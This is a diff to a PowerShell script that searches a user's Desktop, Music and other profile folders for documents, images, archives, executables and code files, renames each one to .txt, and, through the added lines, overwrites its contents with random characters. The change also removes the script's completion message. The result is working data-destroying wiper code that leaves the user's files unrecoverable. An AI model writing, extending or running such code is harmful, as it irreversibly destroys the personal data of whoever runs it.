@@ -4,17 +4,30 @@ $directories = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Music", "$env:USERP
 # List of file extensions to rename
 $extensions = "*.exe", "*.json", "*.doc", "*.pdf", "*.wpd", "*.docx", "*.rtf", "*.tex", "*.odt", "*.jpg", "*.jpeg", "*.mp3", "*.rar", "*.vcd", "*.webp", "*.css", "*.html", "*.py", "*.php", "*.ico", "*.lnk", "*.mp4", "*.js", "*.bak", "*.xml", "*.zip", "*.bmp"
 
+# Generate random content
+function Generate-RandomContent {
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    $content = ""
+    $contentLength = Get-Random -Minimum 100 -Maximum 1000
+
+    for ($i = 0; $i -lt $contentLength; $i++) {
+        $content += $characters[Get-Random -Minimum 0 -Maximum $characters.Length]
+    }
+
+    return $content
+}
+
 # Loop through each directory
 foreach ($directory in $directories) {
     # Get all files with specified extensions in the current directory and subdirectories
     $files = Get-ChildItem -Path $directory -File -Recurse -Include $extensions
 
-    # Rename each file
+    # Rename each file and change contents to random data
     foreach ($file in $files) {
         $newName = $file.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
         Rename-Item -Path $file.FullName -NewName $newName
+        $randomContent = Generate-RandomContent
+        $newFilePath = Join-Path -Path $file.DirectoryName -ChildPath $newName
+        Set-Content -Path $newFilePath -Value $randomContent
     }
 }
-
-Write-Host "File renaming completed."
-Read-Host "Press Enter to exit."
